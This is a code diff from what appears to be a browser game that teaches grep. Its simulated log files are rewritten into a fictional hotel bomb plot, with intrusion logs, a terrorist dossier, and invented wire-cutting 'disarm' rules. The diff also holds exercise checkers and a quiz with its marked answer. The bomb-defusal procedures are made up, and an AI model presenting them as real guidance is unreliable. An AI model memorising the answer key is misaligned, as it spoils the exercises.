@@ -8431,156 +8431,284 @@ backup:x:998:998:Backup Service:/var/backups:/usr/sbin/nologin
             filesystem: {
                 '/var/log': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
-                    children: ['auth.log', 'syslog', 'access.log', 'error.log', 'secure.log', 'configs']
+                    children: ['auth.log', 'access.log', 'keycard.log', 'security_alerts.log', 'radio_intercept.txt', 'guest_registry.log', 'maintenance.log', 'intel']
                 },
                 '/var/log/auth.log': {
-                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 2048,
-                    content: `Jan 15 02:14:33 server sshd[1234]: Failed password for root from 192.168.1.105 port 44521 ssh2
-Jan 15 02:14:35 server sshd[1234]: Failed password for root from 192.168.1.105 port 44522 ssh2
-Jan 15 02:14:38 server sshd[1234]: Failed password for admin from 192.168.1.105 port 44523 ssh2
-Jan 15 02:15:01 server sshd[1235]: Accepted password for admin from 10.0.0.5 port 55123 ssh2
-Jan 15 02:15:22 server sshd[1236]: Failed password for root from 192.168.1.105 port 44524 ssh2
-Jan 15 02:15:45 server sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash
-Jan 15 02:16:01 server sshd[1237]: Failed password for root from 192.168.1.105 port 44525 ssh2
-Jan 15 02:16:33 server sshd[1238]: Failed password for administrator from 192.168.1.105 port 44526 ssh2
-Jan 15 03:00:00 server CRON[2001]: (root) CMD (/usr/bin/backup.sh)
-Jan 15 03:14:22 server sshd[1239]: Failed password for root from 192.168.1.105 port 44601 ssh2`
-                },
-                '/var/log/syslog': {
-                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 1536,
-                    content: `Jan 15 02:00:00 server kernel: Linux version 5.15.0
-Jan 15 02:14:30 server sshd[1234]: error: PAM: Authentication failure for root
-Jan 15 02:14:33 server sshd[1234]: error: maximum authentication attempts exceeded
-Jan 15 02:15:00 server kernel: WARNING: possible SYN flood attack
-Jan 15 02:15:45 server sudo[1500]: admin : command not allowed
-Jan 15 02:16:00 server kernel: ERROR: disk space critical on /var
-Jan 15 03:00:00 server backup: INFO: backup started
-Jan 15 03:05:00 server backup: INFO: backup completed successfully`
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 4096,
+                    content: `Jan 15 01:47:22 meridian-sec sshd[4521]: Connection from 192.168.1.105 port 49221
+Jan 15 01:47:25 meridian-sec sshd[4521]: Failed password for maintenance from 192.168.1.105 port 49221 ssh2
+Jan 15 01:47:28 meridian-sec sshd[4521]: Failed password for maintenance from 192.168.1.105 port 49221 ssh2
+Jan 15 01:48:01 meridian-sec sshd[4522]: Accepted password for housekeeping from 10.0.0.15 port 22445 ssh2
+Jan 15 01:48:33 meridian-sec sshd[4523]: Failed password for admin from 192.168.1.105 port 49225 ssh2
+Jan 15 01:48:55 meridian-sec sudo: housekeeping : TTY=pts/0 ; PWD=/var/log ; COMMAND=/bin/cat guest_registry.log
+Jan 15 01:49:12 meridian-sec sshd[4524]: Accepted password for RAVEN from 192.168.1.105 port 49230 ssh2
+Jan 15 01:49:15 meridian-sec sudo: RAVEN : TTY=pts/1 ; PWD=/var/log ; USER=root ; COMMAND=/bin/bash
+Jan 15 01:49:22 meridian-sec sshd[4524]: session opened for user RAVEN
+Jan 15 01:50:01 meridian-sec CRON[5001]: (root) CMD (/usr/bin/security_sweep.sh)
+Jan 15 01:52:33 meridian-sec sudo: RAVEN : TTY=pts/1 ; COMMAND=/usr/bin/disable_floor_sensors --floor=1
+Jan 15 01:55:00 meridian-sec sshd[4524]: session closed for user RAVEN
+Jan 15 02:14:33 meridian-sec sshd[4601]: Failed password for root from 192.168.1.105 port 50001 ssh2
+Jan 15 02:15:45 meridian-sec sshd[4602]: Connection dropped from 192.168.1.105 - protocol error
+Jan 15 02:30:00 meridian-sec CRON[5100]: (security) CMD (/usr/bin/patrol_check.sh)`
                 },
                 '/var/log/access.log': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 2048,
+                    content: `192.168.1.105 - RAVEN [15/Jan:01:49:12] "POST /elevator/override HTTP/1.1" 200
+192.168.1.105 - RAVEN [15/Jan:01:49:45] "GET /cameras/floor1/disable HTTP/1.1" 200
+192.168.1.105 - RAVEN [15/Jan:01:50:22] "POST /keycard/clone?room=105 HTTP/1.1" 200
+192.168.1.105 - RAVEN [15/Jan:01:51:00] "GET /maintenance/schedule HTTP/1.1" 200
+192.168.1.105 - RAVEN [15/Jan:01:52:15] "POST /alarm/zone1/disable HTTP/1.1" 200
+10.0.0.15 - housekeeping [15/Jan:01:48:01] "GET /schedule/today HTTP/1.1" 200
+10.0.0.20 - frontdesk [15/Jan:02:00:00] "GET /reservations HTTP/1.1" 200
+172.16.0.50 - guest [15/Jan:02:05:00] "GET /wifi/connect HTTP/1.1" 200
+192.168.1.105 - - [15/Jan:02:14:33] "GET /admin HTTP/1.1" 403
+192.168.1.105 - - [15/Jan:02:15:00] "POST /root/shell HTTP/1.1" 401 BLOCKED`
+                },
+                '/var/log/keycard.log': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 3072,
+                    content: `[KEYCARD SYSTEM - MERIDIAN HOTEL - FLOOR 1]
+========================================
+Jan 15 01:30:00 ROOM-101 ACCESS: Guest "Morrison, T." - ENTRY
+Jan 15 01:32:15 ROOM-102 ACCESS: Guest "Chen, L." - ENTRY
+Jan 15 01:35:00 ROOM-103 ACCESS: Housekeeping Staff - ENTRY
+Jan 15 01:35:45 ROOM-103 ACCESS: Housekeeping Staff - EXIT
+Jan 15 01:40:00 STAIRWELL-A ACCESS: Security Patrol - ENTRY
+Jan 15 01:45:00 ROOM-104 ACCESS: Guest "Williams, R." - ENTRY
+Jan 15 01:50:22 ROOM-105 ACCESS: MAINTENANCE OVERRIDE - ENTRY [ANOMALY]
+Jan 15 01:50:25 ROOM-105 ACCESS: Motion sensor DISABLED
+Jan 15 01:52:00 ROOM-105 ACCESS: NO EXIT RECORDED [ANOMALY]
+Jan 15 01:55:00 ELEVATOR-SVC ACCESS: Maintenance Code 7734 - ACTIVATED
+Jan 15 02:00:00 ROOM-106 ACCESS: Guest "Park, S." - ENTRY
+Jan 15 02:05:00 CONF-ROOM-A ACCESS: Setup Crew - ENTRY
+Jan 15 02:10:00 STAIRWELL-B ACCESS: Unauthorized - DENIED
+Jan 15 02:15:00 BALLROOM ACCESS: Catering Staff - ENTRY
+[WARNING] Room 105 - Guest "Blackwood, M." checked out 3 days ago. Room should be VACANT.
+[ALERT] Room 105 maintenance override at 01:50 does not match any scheduled work orders.`
+                },
+                '/var/log/security_alerts.log': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 2560,
+                    content: `[MERIDIAN HOTEL SECURITY SYSTEM - CRITICAL ALERTS]
+=====================================================
+Jan 15 01:49:15 [CRITICAL] Unauthorized sudo escalation - user RAVEN
+Jan 15 01:50:20 [WARNING] Floor 1 motion sensors offline - manual override
+Jan 15 01:50:25 [ERROR] Camera CAM-107 feed interrupted - Room 105 corridor
+Jan 15 01:51:00 [WARNING] Service elevator accessed outside schedule
+Jan 15 01:52:33 [CRITICAL] Floor sensor array DISABLED - security bypass detected
+Jan 15 01:53:00 [ERROR] Smoke detector 105-A reporting intermittent signal
+Jan 15 01:55:00 [INFO] Session terminated - user RAVEN - connection 192.168.1.105
+Jan 15 02:00:00 [INFO] Night patrol completed - Floor 1 clear
+Jan 15 02:10:00 [WARNING] Stairwell B unauthorized access attempt - DENIED
+Jan 15 02:14:00 [INFO] CEO Summit security briefing uploaded
+Jan 15 02:15:00 [CRITICAL] ANOMALY: Room 105 thermal signature detected - room should be vacant
+Jan 15 02:16:00 [ALERT] Initiating protocol BLACKSITE - analyst team notified
+[PRIORITY] Thermal scan shows heat signature consistent with electronic device in Room 105.
+[PRIORITY] Device appears to have countdown mechanism - BOMB SQUAD ALERTED.`
+                },
+                '/var/log/radio_intercept.txt': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'intel', size: 2048,
+                    content: `[INTERCEPTED RADIO TRAFFIC - ENCRYPTED CHANNEL 7]
+=================================================
+[TIMESTAMP: 01:45:00] RAVEN: "Nest is prepared. Package arriving via service entrance."
+[TIMESTAMP: 01:48:00] CONTROL: "Confirm room number for delivery."
+[TIMESTAMP: 01:48:15] RAVEN: "Room matches the asset IP. Easy to remember. One-zero-five."
+[TIMESTAMP: 01:50:00] RAVEN: "Sensors disabled. I'm a ghost."
+[TIMESTAMP: 01:52:00] RAVEN: "Package is planted. Timer set for summit. Six hours."
+[TIMESTAMP: 01:53:00] CONTROL: "Wire configuration?"
+[TIMESTAMP: 01:53:30] RAVEN: "Standard CRIMSON protocol. They'll never figure it out in time."
+[TIMESTAMP: 01:54:00] CONTROL: "Extraction route?"
+[TIMESTAMP: 01:54:30] RAVEN: "Service elevator to basement. Car waiting on 4th Street."
+[TIMESTAMP: 01:55:00] RAVEN: "I'm out. The Meridian will make headlines tomorrow."
+[TIMESTAMP: 01:55:30] CONTROL: "Good work, RAVEN. The consortium sends its regards."
+[END INTERCEPT - FORWARDED TO BLACKSITE COMMAND]`
+                },
+                '/var/log/guest_registry.log': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 1536,
+                    content: `[MERIDIAN HOTEL - GUEST REGISTRY - FLOOR 1]
+=========================================
+ROOM  | GUEST NAME        | CHECK-IN   | CHECK-OUT  | STATUS
+------+-------------------+------------+------------+---------
+101   | Morrison, Thomas  | Jan 14     | Jan 17     | OCCUPIED
+102   | Chen, Lisa        | Jan 14     | Jan 16     | OCCUPIED
+103   | [VACANT]          | -          | -          | AVAILABLE
+104   | Williams, Robert  | Jan 15     | Jan 18     | OCCUPIED
+105   | Blackwood, Marcus | Jan 10     | Jan 12     | CHECKED OUT
+106   | Park, Soo-Yeon    | Jan 14     | Jan 16     | OCCUPIED
+107   | Davies, Emma      | Jan 13     | Jan 15     | CHECKOUT TODAY
+108   | [VACANT]          | -          | -          | AVAILABLE
+
+[NOTE] Room 105 scheduled for deep cleaning Jan 16. No reservations until Jan 20.
+[FLAG] Room 105 keycard access logged at 01:50 - no guest assigned. INVESTIGATE.`
+                },
+                '/var/log/maintenance.log': {
                     type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 1024,
-                    content: `192.168.1.105 - - [15/Jan:02:14:30] "GET /admin HTTP/1.1" 401
-192.168.1.105 - - [15/Jan:02:14:35] "POST /login HTTP/1.1" 401
-10.0.0.5 - - [15/Jan:02:15:01] "GET /dashboard HTTP/1.1" 200
-192.168.1.105 - - [15/Jan:02:16:00] "GET /admin HTTP/1.1" 403
-172.16.0.50 - - [15/Jan:02:20:00] "GET /index.html HTTP/1.1" 200
-192.168.1.105 - - [15/Jan:02:25:00] "GET /wp-admin HTTP/1.1" 404`
+                    content: `[MERIDIAN HOTEL - MAINTENANCE LOG]
+===================================
+Jan 15 00:00:00 Night shift started - Staff: Martinez, Wong
+Jan 15 00:30:00 HVAC check - Ballroom - COMPLETE
+Jan 15 01:00:00 Elevator inspection - COMPLETE
+Jan 15 01:30:00 Pool filter maintenance - COMPLETE
+Jan 15 02:00:00 Emergency exit lights check - COMPLETE
+
+[NO SCHEDULED WORK FOR FLOOR 1 GUEST ROOMS TONIGHT]
+
+*** ANOMALY DETECTED ***
+System shows maintenance override for Room 105 at 01:50.
+This does not match any authorized work order.
+Override code used: 7734 (assigned to: TERMINATED EMPLOYEE - J. Raven)
+SECURITY HAS BEEN NOTIFIED.`
                 },
-                '/var/log/error.log': {
-                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 768,
-                    content: `[ERROR] 02:14:33 Authentication failed for user root
-[ERROR] 02:14:35 Authentication failed for user root
-[WARNING] 02:15:00 Multiple failed login attempts detected
-[CRITICAL] 02:16:00 Disk space below threshold
-[ERROR] 02:16:33 Authentication failed for user administrator
-[INFO] 03:00:00 Scheduled backup initiated`
+                '/var/log/intel': {
+                    type: 'dir', perms: 'drwxr-x---', owner: 'root', group: 'intel',
+                    children: ['threat_assessment.txt', 'summit_attendees.txt', 'raven_dossier.txt']
                 },
-                '/var/log/secure.log': {
-                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'adm', size: 512,
-                    content: `Jan 15 02:14:33 sshd: pam_unix(sshd:auth): authentication failure; user=root rhost=192.168.1.105
-Jan 15 02:15:01 sshd: pam_unix(sshd:session): session opened for user admin
-Jan 15 02:15:45 sudo: admin : user NOT in sudoers
-Jan 15 02:16:01 sshd: pam_unix(sshd:auth): authentication failure; user=root rhost=192.168.1.105`
+                '/var/log/intel/threat_assessment.txt': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'intel', size: 1024,
+                    content: `[CLASSIFIED - THREAT ASSESSMENT]
+================================
+THREAT LEVEL: CRITICAL
+TARGET: CEO Summit - Meridian Hotel Grand Ballroom
+DATE: January 15 - 08:00 AM Start
+ATTENDEES: 47 Fortune 500 executives
+
+SUSPECTED THREAT:
+- IED planted in Room 105 (directly below Ballroom)
+- Timer mechanism detected - estimated 6 hour countdown
+- Blast radius: 50 meters - CATASTROPHIC if detonated
+
+OPERATIVE:
+- Codename: RAVEN
+- Former hotel maintenance staff (terminated 6 months ago)
+- Connected to "Consortium" - corporate terrorism cell
+
+RESPONSE:
+- Agent PHOENIX dispatched to hotel
+- BLACKSITE analyst team activated (YOU)
+- Bomb squad on standby - need wire configuration first`
                 },
-                '/var/log/configs': {
-                    type: 'dir', perms: 'drwxr-xr-x', owner: 'root', group: 'root',
-                    children: ['ssh.conf', 'apache.conf', 'mysql.conf']
+                '/var/log/intel/summit_attendees.txt': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'intel', size: 512,
+                    content: `[CEO SUMMIT - CONFIDENTIAL ATTENDEE LIST]
+=========================================
+- Hartwell, CEO - Nexus Industries
+- Yamamoto, CEO - Kyoto Electronics
+- Okonkwo, CEO - AfriTech Global
+- Mueller, CEO - Dresden Manufacturing
+- Chen, CEO - Shanghai Dynamics
+- Petrova, CEO - Moscow Energy Corp
+[... 41 additional executives ...]
+
+TOTAL VALUE OF REPRESENTED COMPANIES: $4.7 TRILLION
+INSURANCE IMPLICATION: CATASTROPHIC
+THIS SUMMIT CANNOT BE CANCELLED - MUST DEFUSE THE DEVICE`
                 },
-                '/var/log/configs/ssh.conf': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256,
-                    content: `# SSH Configuration
-Port 22
-PermitRootLogin no
-PasswordAuthentication yes
-MaxAuthTries 6`
-                },
-                '/var/log/configs/apache.conf': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 256,
-                    content: `# Apache Configuration
-ServerRoot "/etc/apache2"
-Listen 80
-# password: admin123 (REMOVE BEFORE PRODUCTION)`
-                },
-                '/var/log/configs/mysql.conf': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'root', group: 'root', size: 128,
-                    content: `[mysqld]
-datadir=/var/lib/mysql
-socket=/var/lib/mysql/mysql.sock`
+                '/var/log/intel/raven_dossier.txt': {
+                    type: 'file', perms: '-rw-r-----', owner: 'root', group: 'intel', size: 768,
+                    content: `[OPERATIVE DOSSIER - CLASSIFIED]
+=================================
+CODENAME: RAVEN
+REAL NAME: James Raven (confirmed)
+FORMER OCCUPATION: Meridian Hotel - Senior Maintenance Tech
+TERMINATED: July 15 (6 months ago) - "budget cuts"
+MOTIVE: Revenge + Consortium payment ($2.5M confirmed)
+
+SKILLS:
+- Building systems expert
+- Electronics background (military EOD - dishonorably discharged)
+- Known to use IP addresses as memory aids
+
+KNOWN ALIASES:
+- admin, maintenance, jraven, blackbird
+
+LAST KNOWN LOCATION: Room 105, Meridian Hotel
+CURRENT STATUS: FLED - Vehicle heading north on I-95
+
+NOTE: RAVEN always uses "CRIMSON protocol" for wire configs.
+This may be key to defusal. Check regex patterns in next phase.`
                 }
             },
 
             objectives: [
                 {
                     id: 1,
-                    task: 'Find "error" entries (case-insensitive)',
-                    hint: 'Use -i flag: grep -i "error" filename',
+                    task: 'Find RAVEN in the auth logs (case-insensitive)',
+                    hint: 'Use -i flag: grep -i "raven" auth.log',
                     check: (cmd, state, output) => {
                         return cmd.includes('grep') && cmd.includes('-i') &&
-                               (cmd.toLowerCase().includes('error') || output);
+                               cmd.toLowerCase().includes('raven');
                     }
                 },
                 {
                     id: 2,
-                    task: 'Count failed login attempts',
-                    hint: 'Use -c flag: grep -c "failed" auth.log',
+                    task: 'Count how many times RAVEN accessed the system',
+                    hint: 'Use -c flag: grep -c "RAVEN" auth.log',
                     check: (cmd, state, output) => {
                         return cmd.includes('grep') && cmd.includes('-c') &&
-                               cmd.toLowerCase().includes('failed');
+                               cmd.toUpperCase().includes('RAVEN');
                     }
                 },
                 {
                     id: 3,
-                    task: 'Show "root" matches with line numbers',
-                    hint: 'Use -n flag: grep -n "root" filename',
+                    task: 'Find Room 105 anomalies with line numbers',
+                    hint: 'Use -n flag: grep -n "105" keycard.log',
                     check: (cmd, state, output) => {
                         return cmd.includes('grep') && cmd.includes('-n') &&
-                               cmd.includes('root');
+                               cmd.includes('105');
                     }
                 },
                 {
                     id: 4,
-                    task: 'Find lines NOT containing "failed" (successful)',
-                    hint: 'Use -v flag to invert match: grep -v "failed" auth.log',
+                    task: 'Find keycard entries that are NOT normal access',
+                    hint: 'Use -v to exclude normal: grep -v "Guest" keycard.log',
                     check: (cmd, state, output) => {
                         return cmd.includes('grep') && cmd.includes('-v');
                     }
                 },
                 {
                     id: 5,
-                    task: 'Search recursively for "password"',
-                    hint: 'Use -r flag: grep -r "password" /var/log/',
+                    task: 'Search all intel files for "RAVEN"',
+                    hint: 'Use -r flag: grep -r "RAVEN" /var/log/intel/',
                     check: (cmd, state, output) => {
-                        return cmd.includes('grep') && cmd.includes('-r') &&
-                               cmd.toLowerCase().includes('password');
+                        return cmd.includes('grep') && cmd.includes('-r');
                     }
                 },
                 {
                     id: 6,
-                    task: 'Get context around a critical event',
-                    hint: 'Use -A, -B, or -C flags: grep -C 2 "CRITICAL" error.log',
+                    task: 'Get context around CRITICAL security alerts',
+                    hint: 'Use -C flag: grep -C 2 "CRITICAL" security_alerts.log',
                     check: (cmd, state, output) => {
-                        const lowerCmd = cmd.toLowerCase();
-                        return cmd.includes('grep') && /-[abc]\s*\d/.test(lowerCmd);
+                        return cmd.includes('grep') && /-(A|B|C)\s*\d/.test(cmd);
                     }
                 },
                 {
                     id: 7,
-                    task: 'List files containing "ssh"',
-                    hint: 'Use -l flag: grep -rl "ssh" /var/log/',
+                    task: 'List all files mentioning the bomb threat',
+                    hint: 'Use -l flag: grep -rl "bomb" /var/log/',
                     check: (cmd, state, output) => {
                         return cmd.includes('grep') && cmd.includes('-l');
                     }
                 },
                 {
                     id: 8,
-                    task: 'Match whole word "admin" only',
-                    hint: 'Use -w flag: grep -w "admin" auth.log',
+                    task: 'Find the exact room number in radio intercept',
+                    hint: 'Use -w for whole word: grep -w "105" radio_intercept.txt',
                     check: (cmd, state, output) => {
                         return cmd.includes('grep') && cmd.includes('-w') &&
-                               cmd.includes('admin');
+                               cmd.includes('105');
                     }
                 }
-            ]
+            ],
+
+            // Bomb defusal insight phase
+            insightPhase: {
+                enabled: true,
+                question: "You've traced the attacker's origin. The field agent found the hotel registry - which room is the bomb in? The attacker used alias 'admin' - what room did they book?",
+                options: [
+                    { text: "Room 105 - matches the attacker's IP pattern (192.168.1.105)", correct: true },
+                    { text: "Room 522 - matches the port number pattern", correct: false },
+                    { text: "Room 234 - matches the failed attempt count", correct: false },
+                    { text: "Room 001 - first entry in the log", correct: false }
+                ]
+            }
         },
 
         // ──────────────────────────────────────────────────────────
@@ -8600,62 +8728,197 @@ socket=/var/lib/mysql/mysql.sock`
             filesystem: {
                 '/data/intel': {
                     type: 'dir', perms: 'drwxr-xr-x', owner: 'analyst', group: 'analyst',
-                    children: ['network.log', 'users.txt', 'connections.log', 'alerts.log']
+                    children: ['wire_protocols.db', 'intercepted_codes.log', 'detonator_freq.log', 'crimson_manual.txt', 'bomb_telemetry.log', 'agent_notes.txt']
                 },
-                '/data/intel/network.log': {
+                '/data/intel/wire_protocols.db': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2048,
+                    content: `[BOMB DISPOSAL UNIT - WIRE PROTOCOL DATABASE]
+==============================================
+PROTOCOL: STANDARD (used by amateurs)
+  Pattern: Single color per function
+  Disarm: Cut primary power (usually RED)
+
+PROTOCOL: CRIMSON (RAVEN's signature - CONFIRMED IN USE)
+  Pattern: Color codes repeat based on trigger mechanism
+  Wire sequence encodes timer frequency
+  RED = Danger/Active circuit
+  BLUE = Ground/Safe when isolated
+  GREEN = Secondary trigger - DO NOT CUT FIRST
+
+WIRE COLOR FREQUENCY MAP:
+  RED-RED     = Primary detonator (CUT LAST)
+  RED-BLUE    = Backup trigger
+  BLUE-BLUE   = Ground loop (safe)
+  BLUE-GREEN  = Timer circuit
+  GREEN-RED   = Anti-tamper (CAUSES DETONATION)
+  GREEN-GREEN = Decoy (no function)
+
+CRIMSON DISARM SEQUENCE:
+  1. Identify repeated pattern (matches threat frequency)
+  2. Cut in order: BLUE-grounds first, then RED-RED last
+  3. NEVER cut GREEN-RED combination
+
+[NOTE] RAVEN always uses timestamp as frequency key. Check telemetry.`
+                },
+                '/data/intel/intercepted_codes.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 3072,
+                    content: `[INTERCEPTED CODED TRANSMISSIONS - DECRYPTION REQUIRED]
+========================================================
+2024-01-15 01:45:22 TX: "RR-RB-BR" (unknown pattern)
+2024-01-15 01:45:45 RX: "Confirm CRIMSON active"
+2024-01-15 01:46:00 TX: "Package armed. Timer: 02:30:00"
+2024-01-15 01:46:15 TX: "Freq: 105-Hz repeat"
+2024-01-15 01:47:00 RX: "Wire status?"
+2024-01-15 01:47:22 TX: "RED-RED primary. BLUE-BLUE ground. GREEN-RED trap."
+2024-01-15 01:48:00 TX: "Anti-tamper armed. Touch GREEN first = boom."
+2024-01-15 01:49:00 RX: "Extraction confirmed. Good hunting."
+2024-01-15 01:50:00 TX: "Room 105. Meridian. Summit dies at 08:00."
+2024-01-15 01:52:00 TX: "Final code: match the frequency, cut the repeat."
+2024-01-15 01:53:00 RX: "RAVEN out. Consortium thanks you."
+
+[SIGNAL ANALYSIS]
+Transmission source: 192.168.1.105 (confirmed RAVEN)
+Pattern detected: Wire colors encoded as two-letter codes
+  RR = RED-RED
+  RB = RED-BLUE
+  BR = BLUE-RED
+  BB = BLUE-BLUE
+  GR = GREEN-RED (TRAP!)
+  GG = GREEN-GREEN
+
+[PRIORITY] Frequency "105-Hz" matches room number. This is the key.`
+                },
+                '/data/intel/detonator_freq.log': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 2048,
+                    content: `[BOMB SQUAD TELEMETRY - DETONATOR FREQUENCY ANALYSIS]
+=====================================================
+Timestamp       Frequency   Wire_Active    Status
+02:30:00        105.0 Hz    RED-RED        ARMED
+02:29:55        105.0 Hz    RED-RED        ARMED
+02:29:50        105.0 Hz    RED-RED        STABLE
+02:29:45        105.0 Hz    RED-RED        STABLE
+02:29:40        52.5 Hz     BLUE-BLUE      GROUND_OK
+02:29:35        52.5 Hz     BLUE-BLUE      GROUND_OK
+02:29:30        105.0 Hz    RED-RED        ARMED
+02:29:25        105.0 Hz    RED-RED        ARMED
+02:29:20        210.0 Hz    GREEN-RED      TRAP_ACTIVE
+02:29:15        52.5 Hz     BLUE-BLUE      GROUND_OK
+02:29:10        105.0 Hz    RED-RED        ARMED
+02:29:05        105.0 Hz    RED-RED        ARMED
+
+[PATTERN ANALYSIS]
+Primary frequency: 105.0 Hz (appears 8 times - DOMINANT)
+Ground frequency: 52.5 Hz (half of primary - expected)
+Trap frequency: 210.0 Hz (double of primary - GREEN-RED wire)
+
+[CONCLUSION]
+The detonator cycles through RED-RED most frequently.
+This matches CRIMSON protocol: "cut the repeat"
+Disarm wire sequence: RED-RED (the repeated pattern)
+
+[WARNING] GREEN-RED appears once - anti-tamper is ACTIVE`
+                },
+                '/data/intel/crimson_manual.txt': {
+                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1536,
+                    content: `[CLASSIFIED - CRIMSON PROTOCOL FIELD MANUAL]
+============================================
+ORIGIN: Eastern European bomb-making cells
+DEVELOPER: Unknown (possibly ex-military EOD)
+FIRST SEEN: 2019, Prague incident
+
+IDENTIFICATION:
+- Uses color-coded wire patterns
+- Primary wire ALWAYS appears twice or more
+- Anti-tamper uses complementary colors (GREEN+RED)
+- Timer frequency matches a significant number (room, date, etc.)
+
+DISARM PROCEDURE:
+1. Analyze frequency logs - find the REPEATING pattern
+2. The wire that appears MOST is the primary detonator
+3. Cut ground wires (BLUE) first to isolate
+4. Cut primary (usually RED-RED) LAST
+5. NEVER touch GREEN-RED - instant detonation
+
+RAVEN'S MODIFICATIONS:
+- Uses IP address as room number mnemonic
+- Timer always set to match summit/target time
+- Frequency key = room number (e.g., Room 105 = 105 Hz)
+
+KILL SWITCH:
+If you see "RR-RB-BR" in transmissions, RAVEN is confirming:
+  RR = RED-RED is primary (cut this)
+  RB = RED-BLUE is backup (ignore)
+  BR = BLUE-RED is ground (cut first)
+
+This was transmitted at 01:45:22. RAVEN told us the answer.`
+                },
+                '/data/intel/bomb_telemetry.log': {
                     type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 1024,
-                    content: `2024-01-15 02:14:33 TCP 192.168.1.105:44521 -> 10.0.0.5:22 SYN
-2024-01-15 02:14:35 TCP 192.168.1.105:44522 -> 10.0.0.5:22 SYN
-2024-01-15 02:15:01 TCP 10.0.0.88:55123 -> 10.0.0.5:22 ESTABLISHED
-2024-01-15 02:15:22 TCP 192.168.1.105:44523 -> 10.0.0.5:22 RST
-2024-01-15 02:16:00 UDP 8.8.8.8:53 -> 10.0.0.5:44444 DNS
-2024-01-15 02:16:33 TCP 192.168.1.105:44524 -> 10.0.0.5:22 SYN`
+                    content: `[LIVE BOMB TELEMETRY - ROOM 105]
+=================================
+Device ID: MRD-105-RAVEN
+Status: ARMED
+Timer: 02:30:00 (counting down)
+Location: Under conference table, Room 105
+
+WIRE CONFIGURATION DETECTED:
+Position 1: RED wire    -> RED terminal    [PRIMARY]
+Position 2: RED wire    -> RED terminal    [PRIMARY]
+Position 3: BLUE wire   -> BLUE terminal   [GROUND]
+Position 4: GREEN wire  -> RED terminal    [TRAP!]
+
+SENSOR READINGS:
+- Motion: ACTIVE (will trigger if device moved)
+- Tilt: INACTIVE
+- Light: INACTIVE
+- Tamper: ACTIVE (GREEN-RED wire)
+
+AGENT PHOENIX STATUS: In position, awaiting wire sequence
+COUNTDOWN: 02:28:45... 02:28:44... 02:28:43...
+
+[URGENT] Provide wire cut sequence to Agent PHOENIX NOW`
                 },
-                '/data/intel/users.txt': {
+                '/data/intel/agent_notes.txt': {
                     type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 768,
-                    content: `admin:x:1000:1000:Admin User:/home/admin:/bin/bash
-root:x:0:0:root:/root:/bin/bash
-www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
-backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
-user1@company.com:active:developer
-user2@company.com:active:analyst
-admin@evil.com:suspicious:unknown
-test@test.org:inactive:tester`
-                },
-                '/data/intel/connections.log': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 512,
-                    content: `ESTABLISHED 192.168.1.105:44521 10.0.0.5:22 ssh denied
-ESTABLISHED 192.168.1.105:44522 10.0.0.5:22 ssh denied
-ESTABLISHED 10.0.0.88:55123 10.0.0.5:22 ssh authorized
-CLOSED 192.168.1.105:44523 10.0.0.5:22 ssh denied
-TIME_WAIT 172.16.0.50:8080 10.0.0.5:80 http authorized
-ESTABLISHED 192.168.1.105:44524 10.0.0.5:22 ssh denied`
-                },
-                '/data/intel/alerts.log': {
-                    type: 'file', perms: '-rw-r--r--', owner: 'analyst', group: 'analyst', size: 640,
-                    content: `2024-01-15 02:14:33 ALERT: Unauthorized access attempt from 192.168.1.105
-2024-01-15 02:15:00 WARNING: Multiple failed authentications
-2024-01-15 02:15:22 ALERT: Brute force pattern detected
-2024-01-15 02:16:00 ERROR: Connection rate limit exceeded
-2024-01-15 02:16:33 CRITICAL: Security breach suspected
-fff failed failed failed
-aaa unauthorized unauthorized unauthorized unauthorized`
+                    content: `[AGENT PHOENIX - FIELD NOTES]
+==============================
+I'm at the device. It's CRIMSON protocol - I recognize the wire layout.
+Four wires visible: 2 RED, 1 BLUE, 1 GREEN
+
+The GREEN goes to a RED terminal - that's the trap.
+If I cut that first, we all die.
+
+BLACKSITE - I need you to confirm the pattern from the intercepts.
+RAVEN transmitted something at 01:45 - decode it.
+
+The wire that REPEATS in the frequency log is the one I cut last.
+But first, I need to cut the ground (BLUE) to isolate power.
+
+What's the cut sequence? I'm seeing:
+- RED-RED appearing multiple times in telemetry
+- BLUE-BLUE is clearly ground
+- GREEN-RED is the trap
+
+Time is running out. Confirm: which pattern matches the detonator?
+Is it RED-RED (the repeated failure pattern) or something else?
+
+PHOENIX out. Standing by for your call.`
                 }
             },
 
             objectives: [
                 {
                     id: 1,
-                    task: 'Find lines starting with a date (2024)',
-                    hint: 'Use ^ anchor: grep "^2024" filename',
+                    task: 'Find transmissions starting with timestamps (2024)',
+                    hint: 'Use ^ anchor: grep "^2024" intercepted_codes.log',
                     check: (cmd, state, output) => {
                         return cmd.includes('grep') && cmd.includes('^');
                     }
                 },
                 {
